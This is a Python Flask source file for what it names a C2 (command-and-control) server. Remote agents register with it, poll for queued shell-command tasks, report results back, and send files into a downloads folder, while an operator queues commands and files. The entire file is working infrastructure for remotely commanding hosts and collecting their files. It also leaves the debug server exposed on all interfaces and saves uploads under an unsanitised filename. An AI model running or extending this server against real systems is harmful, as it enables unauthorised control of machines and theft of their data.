# server.py
from flask import Flask, request, jsonify, send_file # type: ignore
import time
import uuid
import sqlite3      #We use sqlite becuase it's Lightweight, file-based, no server needed.
import os           #It helps in file system tasks (e.g., creating directories, paths)
from werkzeug.utils import secure_filename      # type: ignore #Flask with Werkzeug for file handling

app = Flask(__name__)

# SQLite setup for persistence
DB_FILE = 'c2.db'           #manage agent info, tasks, and reports in SQLite.
def init_db():              #This is an SQLite database file storing tables for agents, tasks, and reports.
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (agent_id TEXT PRIMARY KEY, os TEXT, cwd TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks 
                 (agent_id TEXT, task_id TEXT PRIMARY KEY, task TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reports 
                 (agent_id TEXT, task_id TEXT, result TEXT, cwd TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Helper functions for DB operations
def get_agents():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()                       #A cursor fetches results from the database connection.
    c.execute("SELECT * FROM agents")
    rows = c.fetchall()
    conn.close()
    return {row[0]: {"os": row[1], "cwd": row[2], "last_seen": row[3]} for row in rows}

def update_agent(agent_id, os_type, cwd, last_seen):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?)", (agent_id, os_type, cwd, last_seen))
    conn.commit()
    conn.close()

def assign_task_db(agent_id, task_id, task):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO tasks VALUES (?, ?, ?)", (agent_id, task_id, task))
    conn.commit()
    conn.close()

def get_task_db(agent_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT task_id, task FROM tasks WHERE agent_id = ?", (agent_id,))
    row = c.fetchone()
    if row:
        c.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.commit()
    conn.close()
    return {"task_id": row[0], "task": row[1]} if row else {}

def report_db(agent_id, task_id, result, cwd):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO reports VALUES (?, ?, ?, ?)", (agent_id, task_id, result, cwd))
    conn.commit()
    conn.close()

def get_report_db(agent_id, task_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT result, cwd FROM reports WHERE agent_id = ? AND task_id = ?", (agent_id, task_id))
    row = c.fetchone()
    conn.close()
    return {"result": row[0], "cwd": row[1]} if row else {}

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    agent_id = data.get("agent_id")
    os_type = data.get("os")
    cwd = data.get("cwd")
    last_seen = time.strftime("%Y-%m-%d %H:%M:%S")
    update_agent(agent_id, os_type, cwd, last_seen)
    print(f"[Server] Agent registered: {agent_id} ({os_type}) [cwd: {cwd}] [last_seen: {last_seen}]")
    return jsonify({"status": "registered"})

@app.route("/agents", methods=["GET"])
def list_agents():
    agents = get_agents()
    return jsonify({"agents": [{"agent_id": aid, **info} for aid, info in agents.items()]})
            #it builds a new dict: {"agent_id": aid, **info} where aid->agent_id and **info unpacks the dict (e.g., adds "os": "linux", etc.)



@app.route("/assign/<agent_id>", methods=["POST"])
def assign_task(agent_id):
    data = request.json
    task = data.get("task")
    if not task:
        return jsonify({"error": "No task provided"}), 400
    task_id = str(uuid.uuid4())[:8]
    assign_task_db(agent_id, task_id, task)
    print(f"[Server] Task assigned to {agent_id}: ID {task_id} - Command: {task}")
    return jsonify({"task_id": task_id})

#Tasks are posted by a controller to the server, which queues them in the database; agents poll (GET) the server to retrieve and execute them.



@app.route("/get_task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    last_seen = time.strftime("%Y-%m-%d %H:%M:%S")
    agents = get_agents()
    if agent_id in agents:
        update_agent(agent_id, agents[agent_id]["os"], agents[agent_id]["cwd"], last_seen)
    task_data = get_task_db(agent_id)
    if task_data:
        print(f"[Server] Delivered task to {agent_id}: ID {task_data['task_id']} - Command: {task_data['task']}")
        return jsonify(task_data)
    return jsonify({})
    print(f"[Server] {agent_id} polled for task at {last_seen}")        #last update


@app.route("/report/<agent_id>", methods=["POST"])
def report(agent_id):
    data = request.json
    task_id = data.get("task_id")
    result = data.get("result")
    cwd = data.get("cwd")
    report_db(agent_id, task_id, result, cwd)
    print(f"[Server] Report received from {agent_id} for task {task_id}: Result - {result} [cwd: {cwd}]")
    return jsonify({"status": "ok"})

@app.route("/get_report/<agent_id>/<task_id>", methods=["GET"])
def get_report(agent_id, task_id):
    report = get_report_db(agent_id, task_id)
    if report:
        print(f"[Server] Delivered report for {agent_id} task {task_id}: {report['result']}")
    return jsonify(report)

#Reports are fetched from and stored in the SQLite database; agents send data to the server via POST requests, 
#which the server saves, and a controller (like an admin tool) retrieves it via GET requests.


@app.route("/upload/<agent_id>", methods=["POST"])
def upload_file(agent_id):
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    file = request.files['file']
    filename = secure_filename(file.filename)       #secure_filename is considered as sanitizer.
    upload_path = os.path.join('uploads', filename)     #Through JOIN function the directory "uploads" combines with the filename.
    os.makedirs('uploads', exist_ok=True)
    file.save(upload_path)
    task_id = str(uuid.uuid4())[:8]
    task = f"upload {upload_path} {filename}"
    assign_task_db(agent_id, task_id, task)
    print(f"[Server] Uploaded file for {agent_id}: {filename} - Task ID {task_id}")
    return jsonify({"task_id": task_id})


@app.route("/uploads/<filename>", methods=["GET"])
def serve_uploaded_file(filename):
    path = os.path.join("uploads", filename)
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return jsonify({"error": "File not found"}), 404



@app.route("/downloads/<agent_id>/<filename>", methods=["POST"])
def receive_download(agent_id, filename):
    os.makedirs('downloads', exist_ok=True)
    file = request.files.get('file')
    if not file:                                                            #in this function, We only setting the file path to the download folder.
        return jsonify({"error": "No file uploaded"}), 400
    save_path = os.path.join('downloads', filename)
    file.save(save_path)
    print(f"[Server] Received file from {agent_id}: {filename}")
    return jsonify({"status": "File received"})


@app.route("/download/<agent_id>/<filename>", methods=["GET"])
def download_file(agent_id, filename):
    download_path = os.path.join('downloads', filename)
    if os.path.exists(download_path):
        print(f"[Server] Delivered download for {agent_id}: {filename}")    #in this function we actually downloading files.
        return send_file(download_path, as_attachment=True)
    return jsonify({"error": "File not found"}), 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True, threaded=True)  # HTTP mode


    #Each agent will be stored in Threat of python so that they can communicate concurrently without blocking each other,
    #Celery for Task Management: We will use celery for task management, if the task becomes heavy then the celery will make sure to send it 
    #to background, so they willrun in background.